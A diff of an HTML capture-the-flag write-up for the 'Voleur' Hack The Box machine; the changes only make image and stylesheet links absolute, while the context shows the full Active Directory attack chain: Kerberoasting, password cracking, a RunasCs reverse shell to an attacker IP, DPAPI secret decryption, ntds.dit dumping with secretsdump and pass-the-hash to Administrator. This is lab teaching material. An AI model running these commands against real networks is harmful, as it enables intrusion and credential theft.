@@ -10,7 +10,7 @@
 <meta name="description" content="Difficulty: Medium 🟠">
 <meta name="author" content="">
 <link rel="canonical" href="https://conper.github.io/writeups/medium/voleur/">
-<link crossorigin="anonymous" href="../../../assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="https://conper.github.io/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://conper.github.io/assets/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://conper.github.io/assets/favicon.ico">
 <link rel="icon" type="image/png" sizes="32x32" href="https://conper.github.io/assets/favicon.ico">
@@ -241,12 +241,12 @@ img:hover {
 </style>
 <p>We start by performing a <strong>quick port scan</strong> with <strong>Nmap</strong> to see which ports are open.</p>
 <pre tabindex="0"><code>sudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76
-</code></pre><p><img alt="1" loading="lazy" src="../../../images/writeups/voleur/1.png"></p>
+</code></pre><p><img alt="1" loading="lazy" src="https://conper.github.io/images/writeups/voleur/1.png"></p>
 <p>Using these ports, we now perform a <strong>deeper scan</strong>, saving the results to a file called &ldquo;<em><strong>target</strong></em>&rdquo;.</p>
 <pre tabindex="0"><code>nmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target
-</code></pre><p><img alt="2" loading="lazy" src="../../../images/writeups/voleur/2.png"></p>
+</code></pre><p><img alt="2" loading="lazy" src="https://conper.github.io/images/writeups/voleur/2.png"></p>
 <p>We add the domain to the <em><strong>/etc/hosts</strong></em> file so we can resolve both the <strong>domain</strong> and the <strong>domain controller</strong> name.</p>
-<p><img alt="3" loading="lazy" src="../../../images/writeups/voleur/3.png"></p>
+<p><img alt="3" loading="lazy" src="https://conper.github.io/images/writeups/voleur/3.png"></p>
 <p>To start hacking the machine, we are given some initial credentials.</p>
 <pre tabindex="0"><code>ryan.naylor : HollowOct31Nyt
 </code></pre><p>When trying to enumerate <strong>SMB shares</strong> with the credentials <code>ryan.naylor:HollowOct31Nyt</code>, authentication fails. This is not because the credentials are wrong, but because the <strong>Active Directory</strong> server does not allow direct authentication with username and password, it requires <strong>Kerberos</strong>. In other words, before interacting with <strong>SMB</strong>, we need a <strong>TGT</strong> (Ticket Granting Ticket) that proves our identity to the <strong>KDC</strong> (Key Distribution Center, the central server that issues authentication tickets in the domain).</p>
@@ -257,27 +257,27 @@ img:hover {
 </code></pre><p>Then, I exported the generated file to the <strong>KRB5CCNAME</strong> environment variable.</p>
 <pre tabindex="0"><code>export KRB5CCNAME=$PWD/ryan.naylor.ccache
 </code></pre><p>This tells all <strong>Kerberos</strong> tools (and <strong>SMB</strong> in our case) to use that ticket instead of attempting to authenticate directly with the password.</p>
-<p><img alt="4" loading="lazy" src="../../../images/writeups/voleur/4.png"></p>
+<p><img alt="4" loading="lazy" src="https://conper.github.io/images/writeups/voleur/4.png"></p>
 <p>You can use <code>klist</code> to verify that the ticket was loaded correctly.</p>
-<p><img alt="5" loading="lazy" src="../../../images/writeups/voleur/5.png"></p>
+<p><img alt="5" loading="lazy" src="https://conper.github.io/images/writeups/voleur/5.png"></p>
 <p>Now, to access the shared resources, instead of <code>smbclient</code> I used <code>impacket-smbclient</code>, as it offers more reliable <strong>Kerberos</strong> support and allows directly using <strong>cached tickets</strong> (-k -no-pass).</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb
-</code></pre><p><img alt="6" loading="lazy" src="../../../images/writeups/voleur/6.png"></p>
+</code></pre><p><img alt="6" loading="lazy" src="https://conper.github.io/images/writeups/voleur/6.png"></p>
 <p>We found an <strong>Excel file</strong> that is password protected, so we cannot open it directly. We use <code>office2john</code> to extract the password <strong>hash</strong> and save it to a file.</p>
-<p><img alt="7" loading="lazy" src="../../../images/writeups/voleur/7.png"></p>
+<p><img alt="7" loading="lazy" src="https://conper.github.io/images/writeups/voleur/7.png"></p>
 <pre tabindex="0"><code>office2john Access_Review.xlsx &gt; hash
 </code></pre><p>Then we use <strong>John The Ripper</strong> to crack the password.</p>
 <pre tabindex="0"><code>john -w=/usr/share/wordlists/rockyou.txt hash
-</code></pre><p><img alt="8" loading="lazy" src="../../../images/writeups/voleur/8.png"></p>
+</code></pre><p><img alt="8" loading="lazy" src="https://conper.github.io/images/writeups/voleur/8.png"></p>
 <p>Once we know the password, we can access the <strong>Excel file</strong>.</p>
-<p><img alt="9" loading="lazy" src="../../../images/writeups/voleur/9.png"></p>
+<p><img alt="9" loading="lazy" src="https://conper.github.io/images/writeups/voleur/9.png"></p>
 <p>We obtain the credentials for the users <strong>svc_ldap</strong> and <strong>svc_iis</strong>.</p>
 <pre tabindex="0"><code>svc_ldap : M1XyC9pW7qT5Vn
 svc_iss : N5pXyW1VqM7CZ8
 </code></pre><p>At this point, there’s nothing more interesting to explore.</p>
 <p>We now choose <strong>svc_ldap</strong> instead of <strong>ryan.naylor</strong> for domain mapping with <a href="https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart"><strong>BloodHound</strong></a>, as this user has more extensive <strong>read permissions</strong> that allow collecting all <strong>relationships</strong>, <strong>ACLs</strong>, and possible <strong>escalation paths</strong>, whereas a normal user like <strong>ryan.naylor</strong> would have limited access.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; bloodhound-python -d &#39;voleur.htb&#39; -u &#39;svc_ldap&#39; -p &#39;M1XyC9pW7qT5Vn&#39; -gc &#39;dc.voleur.htb&#39; -ns 10.10.11.76 -v --zip -c all
-</code></pre><p><img alt="10" loading="lazy" src="../../../images/writeups/voleur/10.png"></p>
+</code></pre><p><img alt="10" loading="lazy" src="https://conper.github.io/images/writeups/voleur/10.png"></p>
 <p>We upload the resulting <strong>ZIP</strong> file to <strong>BloodHound</strong> and, analyzing the user <strong>svc_ldap</strong>, we see that they have <code>WriteSPN</code> permissions over the user <strong>svc_winrm</strong> and belong to the <strong>RESTORE_USERS</strong> group, which has <code>GenericWrite</code> permissions over <strong>lacey.miller</strong>. With these permissions, it is possible to perform a <strong>Kerberoasting Attack</strong> to <strong>extract the password hashes</strong> of these users.</p>
 <p>We create another <strong>TGT</strong>, this time for the user <strong>svc_ldap</strong>.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-getTGT voleur.htb/&#39;svc_ldap&#39;:&#39;M1XyC9pW7qT5Vn&#39;
@@ -285,10 +285,10 @@ export KRB5CCNAME=$PWD/svc_ldap.ccache
 </code></pre><p>Then we clone the <a href="https://github.com/ShutdownRepo/targetedKerberoast/tree/main"><strong>targetedKerberoast</strong></a> repository and run it. It uses the <strong>svc_ldap TGT</strong> to request service tickets (<strong>SPNs</strong>) for which it has permissions. These tickets are encrypted as <strong>hashes</strong>, which we can then attempt to <strong>crack</strong>.</p>
 <pre tabindex="0"><code>git clone https://github.com/ShutdownRepo/targetedKerberoast.git
 </code></pre><pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; python3 targetedKerberoast.py -v -d &#39;voleur.htb&#39; -u &#39;svc_ldap&#39; --dc-host dc.voleur.htb -k
-</code></pre><p><img alt="11" loading="lazy" src="../../../images/writeups/voleur/11.png"></p>
+</code></pre><p><img alt="11" loading="lazy" src="https://conper.github.io/images/writeups/voleur/11.png"></p>
 <p>Finally, we use <strong>John the Ripper</strong> to crack the hashes.</p>
 <pre tabindex="0"><code>john -w=/usr/share/wordlists/rockyou.txt hashes
-</code></pre><p><img alt="12" loading="lazy" src="../../../images/writeups/voleur/12.1.png"></p>
+</code></pre><p><img alt="12" loading="lazy" src="https://conper.github.io/images/writeups/voleur/12.1.png"></p>
 <p>We obtain a single <strong>password</strong>, and after testing which account it belongs to, we realize it is for <strong>svc_winrm</strong>.</p>
 <p>Checking the <strong>Excel</strong> file, we see that this user has <strong>Remote Management</strong> permissions, so we can access the machine remotely using Evil-WinRM. To do this, we generate a new <strong>TGT</strong>, this time for the <strong>svc_winrm</strong> user.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-getTGT voleur.htb/&#39;svc_winrm&#39;:&#39;{SVC_WINRM-PASSWORD}&#39;
@@ -307,7 +307,7 @@ export KRB5CCNAME=$PWD/svc_winrm.ccache
   .voleur.htb = VOLEUR.HTB
   voleur.htb = VOLEUR.HTB
 </code></pre><pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; evil-winrm -i dc.voleur.htb -r voleur.htb
-</code></pre><p><img alt="13" loading="lazy" src="../../../images/writeups/voleur/13.png"></p>
+</code></pre><p><img alt="13" loading="lazy" src="https://conper.github.io/images/writeups/voleur/13.png"></p>
 <p>We obtain the <strong>User Flag</strong>, located in the <strong>Desktop</strong> directory.</p>
 <p>As seen earlier, the user <strong>svc_ldap</strong> belongs to the <strong>RESTORE_USERS</strong> group, so if we access it, we can restore the user <strong>todd.wolfe</strong>, identified in the <strong>Excel</strong> file, whose password was provided: <code>NightT1meP1dg3on14</code>.</p>
 <p>The first step is to upload <strong>RunasCS</strong>, an executable that allows us to run commands as another user.</p>
@@ -317,21 +317,21 @@ unzip RunasCs.zip
 <pre tabindex="0"><code>upload RunasCs.exe
 </code></pre><p>Next, we execute a <strong>Reverse Shell</strong> to access the machine as <strong>svc_ldap</strong>.</p>
 <pre tabindex="0"><code>.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.79:4444
-</code></pre><p><img alt="14" loading="lazy" src="../../../images/writeups/voleur/14.png"></p>
+</code></pre><p><img alt="14" loading="lazy" src="https://conper.github.io/images/writeups/voleur/14.png"></p>
 <p>Once inside, we <strong>search for the deleted user</strong>.</p>
 <pre tabindex="0"><code>Get-ADObject -Filter &#39;isDeleted -eq $true&#39; -IncludeDeletedObjects
-</code></pre><p><img alt="15" loading="lazy" src="../../../images/writeups/voleur/15.png"></p>
+</code></pre><p><img alt="15" loading="lazy" src="https://conper.github.io/images/writeups/voleur/15.png"></p>
 <p>We <strong>restore</strong> it using its <strong>ObjectID</strong>.</p>
 <pre tabindex="0"><code>Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
-</code></pre><p><img alt="16" loading="lazy" src="../../../images/writeups/voleur/16.png"></p>
+</code></pre><p><img alt="16" loading="lazy" src="https://conper.github.io/images/writeups/voleur/16.png"></p>
 <p>With the <strong>todd.wolfe</strong> account restored, we can now access its shared resources. Before doing so, we create a <strong>TGT</strong> for this user so we can authenticate correctly and use their permissions.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-getTGT voleur.htb/&#39;todd.wolfe&#39;:&#39;NightT1meP1dg3on14&#39;
 export KRB5CCNAME=$PWD/todd.wolfe.ccache
 </code></pre><pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/todd.wolfe@dc.voleur.htb
 </code></pre><p>Accessing the system as <strong>todd.wolfe</strong>, we can explore their <code>AppData/Roaming/Microsoft</code> directory, which contains critical folders like <strong>Credentials</strong>, <strong>Crypto</strong>, and <strong>Vault</strong>. These folders store sensitive information protected by <strong>DPAPI</strong> (Data Protection API), used by <strong>Windows</strong> to encrypt <strong>passwords</strong>, <strong>keys</strong>, and <strong>user certificates</strong>.</p>
 <p>Since we are already authenticated as the user, we can extract these files and <strong>decrypt</strong> them locally without attacking other account hashes. This exploits the known <strong>DPAPI Weakness</strong> / <strong>Credential Store Exposure</strong>, allowing us to retrieve the current user’s encrypted secrets.</p>
-<p><img alt="16.1" loading="lazy" src="../../../images/writeups/voleur/16.1.png"></p>
-<p><img alt="16.2" loading="lazy" src="../../../images/writeups/voleur/16.2.png"></p>
+<p><img alt="16.1" loading="lazy" src="https://conper.github.io/images/writeups/voleur/16.1.png"></p>
+<p><img alt="16.2" loading="lazy" src="https://conper.github.io/images/writeups/voleur/16.2.png"></p>
 <p><strong>Sensitive file extraction:</strong></p>
 <ul>
 <li><strong>Master Key</strong>: contains the key to decrypt all of the user’s secrets.</li>
@@ -346,32 +346,32 @@ export KRB5CCNAME=$PWD/todd.wolfe.ccache
     -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
     -sid S-1-5-21-3927696377-1337352550-2781715495-1110 \
     -password NightT1meP1dg3on14
-</code></pre><p><img alt="17" loading="lazy" src="../../../images/writeups/voleur/17.png"></p>
+</code></pre><p><img alt="17" loading="lazy" src="https://conper.github.io/images/writeups/voleur/17.png"></p>
 <p>With this <strong>hash</strong>, <strong>we can decrypt files inside Credentials</strong>, which may contain passwords or other encrypted secrets stored by the user.</p>
 <pre tabindex="0"><code>impacket-dpapi credential \
     -file 772275FAD58525253490A9B0039791D3 \
     -key 0xd2832547d1d5e0a01...
-</code></pre><p><img alt="18" loading="lazy" src="../../../images/writeups/voleur/18.png"></p>
+</code></pre><p><img alt="18" loading="lazy" src="https://conper.github.io/images/writeups/voleur/18.png"></p>
 <p>It contains the password for the user <strong>jeremy.combs</strong>.</p>
-<p><img alt="19" loading="lazy" src="../../../images/writeups/voleur/19.png"></p>
+<p><img alt="19" loading="lazy" src="https://conper.github.io/images/writeups/voleur/19.png"></p>
 <p>The user <strong>jeremy.combs</strong> belongs to the <strong>THIRD-LINE TECHNICIANS</strong> group, allowing us to access the group’s shared resources and review stored information, after first creating the <strong>TGT</strong> for this user.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/jeremy.combs@dc.voleur.htb
-</code></pre><p><img alt="20" loading="lazy" src="../../../images/writeups/voleur/20.png"></p>
+</code></pre><p><img alt="20" loading="lazy" src="https://conper.github.io/images/writeups/voleur/20.png"></p>
 <p>Within the shared resources, we find two items of interest: a <strong>note</strong> and an <strong>id_rsa</strong> file, corresponding to an <strong>SSH private key</strong>.</p>
 <p>The content of the note is:</p>
-<p><img alt="21" loading="lazy" src="../../../images/writeups/voleur/21.png"></p>
+<p><img alt="21" loading="lazy" src="https://conper.github.io/images/writeups/voleur/21.png"></p>
 <p>To identify <strong>which user owns the private key</strong>, we generate the <strong>public key</strong> from it using:</p>
 <pre tabindex="0"><code>sudo ssh-keygen -y -f id_rsa
-</code></pre><p><img alt="22" loading="lazy" src="../../../images/writeups/voleur/22.png"></p>
+</code></pre><p><img alt="22" loading="lazy" src="https://conper.github.io/images/writeups/voleur/22.png"></p>
 <p>The user’s name often appears <strong>at the end of the public key</strong>, allowing us to confirm the owner.</p>
 <p>In the <strong>Nmap</strong> scan performed at the start, we had already identified that the <strong>SSH</strong> service is exposed on port <strong>2222</strong>.</p>
 <p>Before using the downloaded <strong>private key</strong>, we set the proper <strong>permissions</strong>.</p>
 <pre tabindex="0"><code>chmod 600 id_rsa
 </code></pre><p>With the key ready, we connect to the <strong>SSH</strong> server on port <strong>2222</strong> using the user <strong>svc_backup</strong>.</p>
 <pre tabindex="0"><code>ssh -i id_rsa -p 2222 svc_backup@voleur.htb
-</code></pre><p><img alt="23" loading="lazy" src="../../../images/writeups/voleur/23.png"></p>
+</code></pre><p><img alt="23" loading="lazy" src="https://conper.github.io/images/writeups/voleur/23.png"></p>
 <p>Connecting via <strong>SSH</strong>, we see we are in a <strong>Linux</strong> environment. Inspecting the <code>/mnt</code> mount point, we find the <strong>Windows C: volume</strong> accessible, meaning we can access the <strong>Windows filesystem</strong> from the <strong>Linux</strong> host. Inside <code>/mnt/c/IT/Third-Line Support</code>, we find a new folder called <em><strong>Backups</strong></em> and within it the <em><strong>Active Directory</strong></em> folder, which contains <code>ntds.dit</code> and <code>ntds.jfm</code>.</p>
-<p><img alt="24" loading="lazy" src="../../../images/writeups/voleur/24.png"></p>
+<p><img alt="24" loading="lazy" src="https://conper.github.io/images/writeups/voleur/24.png"></p>
 <ul>
 <li>
 <p><strong>ntds.dit</strong> is the <strong>main Active Directory database</strong>, storing <strong>user accounts</strong>, <strong>groups</strong>, <strong>policies</strong>, and password <strong>hashes</strong>.</p>
@@ -383,16 +383,16 @@ export KRB5CCNAME=$PWD/todd.wolfe.ccache
 <p>Next, we <strong>download them</strong> to our local machine so we can use them.</p>
 <pre tabindex="0"><code>scp -i id_rsa -P 2222 &#34;svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/*&#34; .
 </code></pre><p>In addition to the <strong>AD database</strong>, we also need the <strong>SYSTEM</strong> file, which contains keys required to decrypt the <strong>hashes</strong> stored in <code>ntds.dit</code>. It is located at <code>/mnt/c/IT/Third-Line Support/Backups/registry</code>.</p>
-<p><img alt="25" loading="lazy" src="../../../images/writeups/voleur/25.png"></p>
+<p><img alt="25" loading="lazy" src="https://conper.github.io/images/writeups/voleur/25.png"></p>
 <pre tabindex="0"><code>scp -i id_rsa -P 2222 &#34;svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Registry/SYSTEM&#34; .
 </code></pre><p>With these three files locally, we use <code>impacket-secretsdump</code> to extract <strong>Active Directory account hashes</strong>.</p>
 <pre tabindex="0"><code>impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
-</code></pre><p><img alt="26" loading="lazy" src="../../../images/writeups/voleur/26.png"></p>
+</code></pre><p><img alt="26" loading="lazy" src="https://conper.github.io/images/writeups/voleur/26.png"></p>
 <p>Among the results, we obtain the <strong>NTLM hash</strong> of the <strong>Administrator</strong> account password, which we use to request a <strong>TGT</strong> for this user. With this <strong>TGT</strong>, we can authenticate as <strong>Administrator</strong> and access their privileges.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-getTGT -hashes :&lt;ADMINISTRATOR_NTLM_HASH&gt; voleur.htb/&#39;Administrator&#39;
 export KRB5CCNAME=$PWD/Administrator.ccache
 </code></pre><pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; evil-winrm -i dc.voleur.htb -r voleur.htb
-</code></pre><p><img alt="27" loading="lazy" src="../../../images/writeups/voleur/27.png"></p>
+</code></pre><p><img alt="27" loading="lazy" src="https://conper.github.io/images/writeups/voleur/27.png"></p>
 <p>Finally, we obtain the <strong>Root Flag</strong> and complete the machine!!</p>
 
 
